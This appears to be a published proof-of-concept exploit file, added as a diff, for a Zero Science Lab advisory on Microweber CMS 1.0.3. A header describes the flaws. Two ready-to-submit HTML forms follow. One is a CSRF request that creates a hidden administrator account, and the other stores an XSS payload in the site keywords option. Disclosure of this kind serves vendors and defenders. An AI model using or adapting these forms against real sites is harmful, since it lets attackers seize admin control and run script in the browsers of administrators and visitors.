@@ -1,0 +1,80 @@
+﻿<!DOCTYPE html>
+<!--
+
+
+Microweber v1.0.3 Stored XSS And CSRF Add Admin Exploit
+
+
+Vendor: Microweber Team
+Product web page: http://www.microweber.com
+Affected version: 1.0.3
+
+Summary: Microweber is an open source drag and drop
+PHP/Laravel CMS licensed under Apache License, Version
+2.0 which allows you to create your own website, blog
+or online shop.
+
+Desc: The application allows users to perform certain
+actions via HTTP requests without performing any validity
+checks to verify the requests. This can be exploited to
+perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site. Stored
+cross-site scripting vulnerabilitity is also discovered.
+The issue is triggered when input passed via the POST
+parameter 'option_value' is not properly sanitized before
+being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session
+in context of an affected site.
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5249
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5249.php
+
+
+12.07.2015
+
+
+-->
+
+
+<html>
+  <title>Microweber v1.0.3 Stored XSS And CSRF Add Admin Exploit</title>
+  <br /><br />
+  <body><center>
+    <form action="http://localhost/microweber-latest/api/save_user" method="POST">
+      <input type="hidden" name="id" value="0" />
+      <input type="hidden" name="thumbnail" value="" />
+      <input type="hidden" name="username" value="Freakazoid" />
+      <input type="hidden" name="password" value="00110001" />
+      <input type="hidden" name="email" value="lab@zeroscience.mk" />
+      <input type="hidden" name="first_name" value="Joe" />
+      <input type="hidden" name="last_name" value="Black" />
+      <input type="hidden" name="is_active" value="1" />
+      <input type="hidden" name="is_admin" value="1" />
+      <input type="hidden" name="basic_mode" value="0" />
+      <input type="hidden" name="api_key" value="" />
+      <input type="submit" value="CSRF Adminize" />
+    </form>
+  </body>
+</html>
+
+<br /><br />
+
+<html>
+  <body>
+    <form action="http://localhost/microweber-latest/api/save_option" method="POST">
+      <input type="hidden" name="option_key" value="website_keywords" />
+      <input type="hidden" name="option_group" value="website" />
+      <input type="hidden" name="option_value" value='"><img src=j onerror=confirm("ZSL")>' />
+      <input type="submit" value="Store XSS" />
+    </form></center>
+  </body>
+</html>
